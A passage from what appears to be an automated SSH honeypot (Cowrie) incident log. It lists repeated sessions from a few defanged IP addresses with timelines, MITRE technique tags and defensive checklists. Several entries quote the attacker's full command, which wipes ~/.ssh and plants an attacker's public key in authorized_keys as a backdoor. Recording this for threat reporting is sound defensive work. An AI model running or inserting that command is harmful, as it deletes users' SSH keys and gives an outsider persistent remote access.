| **Source IP** | `34.123.134[.]194` |
| **First Seen** | 2026-06-08 13:34 |
| **Last Seen** | 2026-06-08 13:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:34:12` | `cowrie.session.connect` |
| `2026-06-08 13:34:12` | `cowrie.client.version` |
| `2026-06-08 13:34:12` | `cowrie.client.kex` |
| `2026-06-08 13:34:13` | `cowrie.login.success` |
| `2026-06-08 13:34:14` | `cowrie.session.params` |
| `2026-06-08 13:34:14` | `cowrie.command.input` |
| `2026-06-08 13:34:14` | `cowrie.command.failed` |
| `2026-06-08 13:34:15` | `cowrie.log.closed` |
| `2026-06-08 13:34:15` | `cowrie.session.params` |
| `2026-06-08 13:34:15` | `cowrie.command.input` |
| `2026-06-08 13:34:15` | `cowrie.session.file_download` |
| `2026-06-08 13:34:15` | `cowrie.log.closed` |
| `2026-06-08 13:34:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.123.134[.]194` to AbuseIPDB if not already reported
- [ ] Block `34.123.134[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aba4db806a84

| Field | Detail |
|---|---|
| **Source IP** | `161.248.189[.]72` |
| **First Seen** | 2026-06-08 13:34 |
| **Last Seen** | 2026-06-08 13:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:34:13` | `cowrie.session.connect` |
| `2026-06-08 13:34:13` | `cowrie.client.version` |
| `2026-06-08 13:34:13` | `cowrie.client.kex` |
| `2026-06-08 13:34:14` | `cowrie.login.success` |
| `2026-06-08 13:34:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.248.189[.]72` to AbuseIPDB if not already reported
- [ ] Block `161.248.189[.]72` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38ef7ee6b999

| Field | Detail |
|---|---|
| **Source IP** | `34.123.134[.]194` |
| **First Seen** | 2026-06-08 13:34 |
| **Last Seen** | 2026-06-08 13:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:34:18` | `cowrie.session.connect` |
| `2026-06-08 13:34:18` | `cowrie.client.version` |
| `2026-06-08 13:34:18` | `cowrie.client.kex` |
| `2026-06-08 13:34:19` | `cowrie.login.success` |
| `2026-06-08 13:34:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.123.134[.]194` to AbuseIPDB if not already reported
- [ ] Block `34.123.134[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-591df6d6c938

| Field | Detail |
|---|---|
| **Source IP** | `34.123.134[.]194` |
| **First Seen** | 2026-06-08 13:38 |
| **Last Seen** | 2026-06-08 13:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:38:08` | `cowrie.session.connect` |
| `2026-06-08 13:38:08` | `cowrie.client.version` |
| `2026-06-08 13:38:08` | `cowrie.client.kex` |
| `2026-06-08 13:38:09` | `cowrie.login.success` |
| `2026-06-08 13:38:10` | `cowrie.session.params` |
| `2026-06-08 13:38:10` | `cowrie.command.input` |
| `2026-06-08 13:38:10` | `cowrie.command.failed` |
| `2026-06-08 13:38:10` | `cowrie.log.closed` |
| `2026-06-08 13:38:11` | `cowrie.session.params` |
| `2026-06-08 13:38:11` | `cowrie.command.input` |
| `2026-06-08 13:38:11` | `cowrie.session.file_download` |
| `2026-06-08 13:38:11` | `cowrie.log.closed` |
| `2026-06-08 13:38:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.123.134[.]194` to AbuseIPDB if not already reported
- [ ] Block `34.123.134[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0101a1e47513

| Field | Detail |
|---|---|
| **Source IP** | `34.123.134[.]194` |
| **First Seen** | 2026-06-08 13:38 |
| **Last Seen** | 2026-06-08 13:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:38:14` | `cowrie.session.connect` |
| `2026-06-08 13:38:14` | `cowrie.client.version` |
| `2026-06-08 13:38:14` | `cowrie.client.kex` |
| `2026-06-08 13:38:15` | `cowrie.login.success` |
| `2026-06-08 13:38:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.123.134[.]194` to AbuseIPDB if not already reported
- [ ] Block `34.123.134[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9cab5b3faa8

| Field | Detail |
|---|---|
| **Source IP** | `179.176.210[.]17` |
| **First Seen** | 2026-06-08 13:39 |
| **Last Seen** | 2026-06-08 13:39 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:39:10` | `cowrie.session.connect` |
| `2026-06-08 13:39:10` | `cowrie.client.version` |
| `2026-06-08 13:39:10` | `cowrie.client.kex` |
| `2026-06-08 13:39:12` | `cowrie.login.success` |
| `2026-06-08 13:39:12` | `cowrie.session.params` |
| `2026-06-08 13:39:12` | `cowrie.command.input` |
| `2026-06-08 13:39:12` | `cowrie.command.failed` |
| `2026-06-08 13:39:13` | `cowrie.log.closed` |
| `2026-06-08 13:39:14` | `cowrie.session.params` |
| `2026-06-08 13:39:14` | `cowrie.command.input` |
| `2026-06-08 13:39:14` | `cowrie.session.file_download` |
| `2026-06-08 13:39:14` | `cowrie.log.closed` |
| `2026-06-08 13:39:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.176.210[.]17` to AbuseIPDB if not already reported
- [ ] Block `179.176.210[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b9055d0f8c4

| Field | Detail |
|---|---|
| **Source IP** | `179.176.210[.]17` |
| **First Seen** | 2026-06-08 13:39 |
| **Last Seen** | 2026-06-08 13:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:39:18` | `cowrie.session.connect` |
| `2026-06-08 13:39:18` | `cowrie.client.version` |
| `2026-06-08 13:39:18` | `cowrie.client.kex` |
| `2026-06-08 13:39:19` | `cowrie.login.success` |
| `2026-06-08 13:39:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.176.210[.]17` to AbuseIPDB if not already reported
- [ ] Block `179.176.210[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5816d0a9b50a

| Field | Detail |
|---|---|
| **Source IP** | `34.123.134[.]194` |
| **First Seen** | 2026-06-08 13:40 |
| **Last Seen** | 2026-06-08 13:40 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:40:12` | `cowrie.session.connect` |
| `2026-06-08 13:40:12` | `cowrie.client.version` |
| `2026-06-08 13:40:12` | `cowrie.client.kex` |
| `2026-06-08 13:40:13` | `cowrie.login.success` |
| `2026-06-08 13:40:14` | `cowrie.session.params` |
| `2026-06-08 13:40:14` | `cowrie.command.input` |
| `2026-06-08 13:40:14` | `cowrie.command.failed` |
| `2026-06-08 13:40:14` | `cowrie.log.closed` |
| `2026-06-08 13:40:15` | `cowrie.session.params` |
| `2026-06-08 13:40:15` | `cowrie.command.input` |
| `2026-06-08 13:40:15` | `cowrie.session.file_download` |
| `2026-06-08 13:40:15` | `cowrie.log.closed` |
| `2026-06-08 13:40:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.123.134[.]194` to AbuseIPDB if not already reported
- [ ] Block `34.123.134[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0c913bd868a

| Field | Detail |
|---|---|
| **Source IP** | `34.123.134[.]194` |
| **First Seen** | 2026-06-08 13:40 |
| **Last Seen** | 2026-06-08 13:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:40:18` | `cowrie.session.connect` |
| `2026-06-08 13:40:18` | `cowrie.client.version` |
| `2026-06-08 13:40:18` | `cowrie.client.kex` |
| `2026-06-08 13:40:19` | `cowrie.login.success` |
| `2026-06-08 13:40:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.123.134[.]194` to AbuseIPDB if not already reported
- [ ] Block `34.123.134[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bd9cb248ccf

| Field | Detail |
|---|---|
| **Source IP** | `34.123.134[.]194` |
| **First Seen** | 2026-06-08 13:42 |
| **Last Seen** | 2026-06-08 13:42 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:42:19` | `cowrie.session.connect` |
| `2026-06-08 13:42:19` | `cowrie.client.version` |
| `2026-06-08 13:42:20` | `cowrie.client.kex` |
| `2026-06-08 13:42:21` | `cowrie.login.success` |
| `2026-06-08 13:42:21` | `cowrie.session.params` |
| `2026-06-08 13:42:21` | `cowrie.command.input` |
| `2026-06-08 13:42:21` | `cowrie.command.failed` |
| `2026-06-08 13:42:22` | `cowrie.log.closed` |
| `2026-06-08 13:42:22` | `cowrie.session.params` |
| `2026-06-08 13:42:22` | `cowrie.command.input` |
| `2026-06-08 13:42:22` | `cowrie.session.file_download` |
| `2026-06-08 13:42:22` | `cowrie.log.closed` |
| `2026-06-08 13:42:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.123.134[.]194` to AbuseIPDB if not already reported
- [ ] Block `34.123.134[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7ec69e5f962

| Field | Detail |
|---|---|
| **Source IP** | `34.123.134[.]194` |
| **First Seen** | 2026-06-08 13:42 |
| **Last Seen** | 2026-06-08 13:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:42:25` | `cowrie.session.connect` |
| `2026-06-08 13:42:25` | `cowrie.client.version` |
| `2026-06-08 13:42:26` | `cowrie.client.kex` |
| `2026-06-08 13:42:27` | `cowrie.login.success` |
| `2026-06-08 13:42:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.123.134[.]194` to AbuseIPDB if not already reported
- [ ] Block `34.123.134[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-208d46b40bce

| Field | Detail |
|---|---|
| **Source IP** | `34.123.134[.]194` |
| **First Seen** | 2026-06-08 13:44 |
| **Last Seen** | 2026-06-08 13:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:44:25` | `cowrie.session.connect` |
| `2026-06-08 13:44:25` | `cowrie.client.version` |
| `2026-06-08 13:44:25` | `cowrie.client.kex` |
| `2026-06-08 13:44:26` | `cowrie.login.success` |
| `2026-06-08 13:44:27` | `cowrie.session.params` |
| `2026-06-08 13:44:27` | `cowrie.command.input` |
| `2026-06-08 13:44:27` | `cowrie.command.failed` |
| `2026-06-08 13:44:27` | `cowrie.log.closed` |
| `2026-06-08 13:44:27` | `cowrie.session.params` |
| `2026-06-08 13:44:27` | `cowrie.command.input` |
| `2026-06-08 13:44:28` | `cowrie.session.file_download` |
| `2026-06-08 13:44:28` | `cowrie.log.closed` |
| `2026-06-08 13:44:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.123.134[.]194` to AbuseIPDB if not already reported
- [ ] Block `34.123.134[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0a924fd2dc5

| Field | Detail |
|---|---|
| **Source IP** | `34.123.134[.]194` |
| **First Seen** | 2026-06-08 13:44 |
| **Last Seen** | 2026-06-08 13:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:44:30` | `cowrie.session.connect` |
| `2026-06-08 13:44:30` | `cowrie.client.version` |
| `2026-06-08 13:44:31` | `cowrie.client.kex` |
| `2026-06-08 13:44:32` | `cowrie.login.success` |
| `2026-06-08 13:44:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.123.134[.]194` to AbuseIPDB if not already reported
- [ ] Block `34.123.134[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-578cc90e0f66

| Field | Detail |
|---|---|
| **Source IP** | `161.248.189[.]72` |
| **First Seen** | 2026-06-08 13:47 |
| **Last Seen** | 2026-06-08 13:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:47:19` | `cowrie.session.connect` |
| `2026-06-08 13:47:19` | `cowrie.client.version` |
| `2026-06-08 13:47:19` | `cowrie.client.kex` |
| `2026-06-08 13:47:19` | `cowrie.login.success` |
| `2026-06-08 13:47:19` | `cowrie.session.params` |
| `2026-06-08 13:47:19` | `cowrie.command.input` |
| `2026-06-08 13:47:19` | `cowrie.command.failed` |
| `2026-06-08 13:47:20` | `cowrie.log.closed` |
| `2026-06-08 13:47:20` | `cowrie.session.params` |
| `2026-06-08 13:47:20` | `cowrie.command.input` |
| `2026-06-08 13:47:20` | `cowrie.session.file_download` |
| `2026-06-08 13:47:20` | `cowrie.log.closed` |
| `2026-06-08 13:47:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.248.189[.]72` to AbuseIPDB if not already reported
- [ ] Block `161.248.189[.]72` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d6283f97a80

| Field | Detail |
|---|---|
| **Source IP** | `161.248.189[.]72` |
| **First Seen** | 2026-06-08 13:47 |
| **Last Seen** | 2026-06-08 13:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:47:21` | `cowrie.session.connect` |
| `2026-06-08 13:47:21` | `cowrie.client.version` |
| `2026-06-08 13:47:21` | `cowrie.client.kex` |
| `2026-06-08 13:47:21` | `cowrie.login.success` |
| `2026-06-08 13:47:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.248.189[.]72` to AbuseIPDB if not already reported
- [ ] Block `161.248.189[.]72` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e272b13bd35

| Field | Detail |
|---|---|
| **Source IP** | `34.123.134[.]194` |
| **First Seen** | 2026-06-08 13:48 |
| **Last Seen** | 2026-06-08 13:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:48:40` | `cowrie.session.connect` |
| `2026-06-08 13:48:40` | `cowrie.client.version` |
| `2026-06-08 13:48:40` | `cowrie.client.kex` |
| `2026-06-08 13:48:41` | `cowrie.login.success` |
| `2026-06-08 13:48:42` | `cowrie.session.params` |
| `2026-06-08 13:48:42` | `cowrie.command.input` |
| `2026-06-08 13:48:42` | `cowrie.command.failed` |
| `2026-06-08 13:48:42` | `cowrie.log.closed` |
| `2026-06-08 13:48:42` | `cowrie.session.params` |
| `2026-06-08 13:48:42` | `cowrie.command.input` |
| `2026-06-08 13:48:43` | `cowrie.session.file_download` |
| `2026-06-08 13:48:43` | `cowrie.log.closed` |
| `2026-06-08 13:48:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.123.134[.]194` to AbuseIPDB if not already reported
- [ ] Block `34.123.134[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96456854ddf7

| Field | Detail |
|---|---|
| **Source IP** | `34.123.134[.]194` |
| **First Seen** | 2026-06-08 13:48 |
| **Last Seen** | 2026-06-08 13:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:48:45` | `cowrie.session.connect` |
| `2026-06-08 13:48:45` | `cowrie.client.version` |
| `2026-06-08 13:48:46` | `cowrie.client.kex` |
| `2026-06-08 13:48:47` | `cowrie.login.success` |
| `2026-06-08 13:48:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.123.134[.]194` to AbuseIPDB if not already reported
- [ ] Block `34.123.134[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6837da7a4dbe

| Field | Detail |
|---|---|
| **Source IP** | `179.176.210[.]17` |
| **First Seen** | 2026-06-08 13:49 |
| **Last Seen** | 2026-06-08 13:49 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
